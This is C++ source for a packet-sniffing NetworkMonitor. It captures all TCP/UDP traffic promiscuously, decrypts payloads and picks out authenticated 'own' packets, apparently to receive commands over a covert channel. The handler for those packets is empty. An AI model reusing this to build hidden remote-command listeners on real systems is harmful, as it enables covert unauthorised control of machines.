//
// Created by bensoer on 31/10/16.
//

#include <sys/socket.h>
#include <netinet/in.h>
#include <cstdio>
#include <zconf.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>       // struct ip and IP_MAXPACKET (which is 65535)
#include "NetworkMonitor.h"
#include "../shared/Logger.h"
#include "../shared/Authenticator.h"
#include "../shared/PacketIdentifier.h"
#include "../shared/HCrypto.h"
#include <sys/epoll.h>
#include <pcap.h>
#include <cstring>

NetworkMonitor * NetworkMonitor::instance = nullptr;

NetworkMonitor::NetworkMonitor(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto) {

    this->crypto = crypto;
    this->trafficAnalyzer = trafficAnalyzer;

    if(!getInterface()){
        Logger::debug("NetworkMonitor - There Was An Error Fetching The Interface For The Monitor");
    }
}

NetworkMonitor* NetworkMonitor::getInstance(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto) {
    if(NetworkMonitor::instance == nullptr){
        NetworkMonitor::instance = new NetworkMonitor(trafficAnalyzer, crypto);
    }

    return NetworkMonitor::instance;
}

void NetworkMonitor::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet) {

    char * BUFFER = (char *)(packet + 16);

    struct iphdr * ip = (struct iphdr *)BUFFER;
    int ipHeaderLength = (ip->ihl * 4);
    int protocol = (ip->protocol);

    //just to make sure we are in the right spot
    Logger::debug("NetworkMonitor:packetCallback - IP Header Length: " + to_string(ipHeaderLength));
    Logger::debug("NetworkMonitor:packetCallback - Protocol: " + to_string(protocol));

    PacketMeta meta = PacketIdentifier::generatePacketMeta(BUFFER);
    char *applicationLayer = PacketIdentifier::findApplicationLayer(&meta);

    if(applicationLayer == nullptr){
        Logger::debug("NetworkMonitor:listenForTraffic - Could Not Find Application Layer. Can't Do Anything With Packet");
        return;
    }else{
        if(NetworkMonitor::instance->crypto->decryptPacket(&meta, applicationLayer) == false){
            Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error Decrypting The Packet. Can't Use The Packet");
            return;
        }
    }

    Logger::debug("NetworkMonitor:listenForTraffic - Decryption Complete. Now Authenticating");
    if(Authenticator::isAuthenticPacket(&meta)){

        //packet has been successfully authenticated. Now to parse out what we need of the message




    }else{
        //if it is not our packet give it to the TrafficAnalyzer
        NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);

    }


}

/**
 * killListening is a helepr method so that the client can tell the NetworkMontior and libpcap to stop listening for
 * packets
 */
void NetworkMonitor::killListening() {
    if(this->currentFD != nullptr){
        pcap_breakloop(this->currentFD);
    }
}

bool NetworkMonitor::getInterface() {

    Logger::debug("Main:getInterfaces - Initializing");

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t * interfaces;
    pcap_if_t * interface;

    Logger::debug("Main:getInterfaces - Finding All Interfaces");

    if(pcap_findalldevs(&interfaces, errbuf) == -1){
        Logger::error("Main:getInterfaces - There Was An Error Fetching The Interfaces");
        cerr << errbuf << endl;
        return false;
    }

    Logger::debug("Main:getInterfaces - Looping Through All Interfaces") ;

    allInterfaces = interfaces;
    interface = interfaces;
    while(interface != NULL){
        const char * name = interface->name;

        Logger::debug("Main:getInterfaces - Testing Interface With Name: " + string(name));

        if(strcmp(name, string("any").c_str()) == 0){
            //this is the any interface
            Logger::debug("Main:getInterfaces - FOUND THE ANY INTERFACE");

            listeningInterface = interface;
            return true;
        }

        interface = interface->next;
    }

    return false;
}

string * NetworkMonitor::listenForTraffic() {


    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 subnetMask;
    bpf_u_int32 ip;

    //fetch network information for interface
    pcap_lookupnet(listeningInterface->name, &subnetMask, &ip, errbuf);

    //open up a raw socket and listen in promisc mode on it for data

    if((this->currentFD = pcap_open_live(listeningInterface->name, BUFSIZ, 1, -1, errbuf)) == NULL){
        Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error in pcap_open_live");
        Logger::debug(string(errbuf));
        return nullptr;
    }

    //setup the libpcap filter
    struct bpf_program fp;
    //compile the filter
    if(pcap_compile(this->currentFD, &fp, "udp or tcp", 0, ip) == -1){
        Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error Compiling The Filter");
        return nullptr;
    }
    //set the filter
    if(pcap_setfilter(this->currentFD, &fp) == -1){
        Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error Setting The Filter");
        return nullptr;
    }

    u_char* args = NULL;
    //listen for packets
    pcap_loop(this->currentFD, 0, NetworkMonitor::packetCallback, args);

    return this->command;


    // --------------------------------------------------------------------------------------


/*

    Logger::debug("NetworkMonitor:listenForTraffic - Setting Up For Read");
    char BUFFER[IP_MAXPACKET];

    struct epoll_event events [ this->EPOLL_QUEUE_LENGTH];
    int num_fd = epoll_wait(this->epollDescriptor, events, this->EPOLL_QUEUE_LENGTH, -1);
    if(num_fd < 0){
        Logger::debug("NetworkMonitor:listenForTraffic - Epoll Wait Error");
        return nullptr;
    }

    Logger::debug("NetworkMonitor:listenForTraffic - Epoll Returned. Now Reading Results");
    for(unsigned int i = 0; i < num_fd; i++){

        //check for errors
        if(events[i].events & (EPOLLHUP | EPOLLERR)){
            Logger::debug("NetworkMonitor:listenForTraffic - Epoll Had An Error. Closing Descriptor");
            close(events[i].data.fd);
            continue;
        }

        if(!(events[i].events & EPOLLIN)){
            Logger::debug("NetworkMonitor::listenForTraffic - Critical Error. Event Has Nothing To Read and No Errors. Why is it here?. Skipping For Now");
            continue;
        }

        // if we make it here then everything is fine and we can start reading from the descriptor
        long bytesRead = read(events[i].data.fd, BUFFER, IP_MAXPACKET);

        Logger::debug("NetworkMonitor:listeningForTraffic - Read Complete");

        struct iphdr * ip = (struct iphdr *)BUFFER;
        int ipHeaderLength = (ip->ihl * 4);
        int protocol = (ip->protocol);

        printf("%d\n", ipHeaderLength);
        printf("%d\n", protocol);

        //how do we know its our packet ?
        //using packet identifier need to determine where our payload information is
        //then need to determine how to authenticate it

        PacketMeta meta = PacketIdentifier::generatePacketMeta(BUFFER);
        char *applicationLayer = PacketIdentifier::findApplicationLayer(&meta);

        if(applicationLayer == nullptr){
            Logger::debug("NetworkMonitor:listenForTraffic - Could Not Find Application Layer. Can't Do Anything With Packet");
            continue;
        }else{
            this->crypto->decryptPacket(&meta, applicationLayer);
        }


        if(Authenticator::isAuthenticPacket(BUFFER)){




        }else{
            //if it is not our packet give it to the TrafficAnalyzer
            this->trafficAnalyzer->addPacketMetaToHistory(meta);

        }
    }

*/


}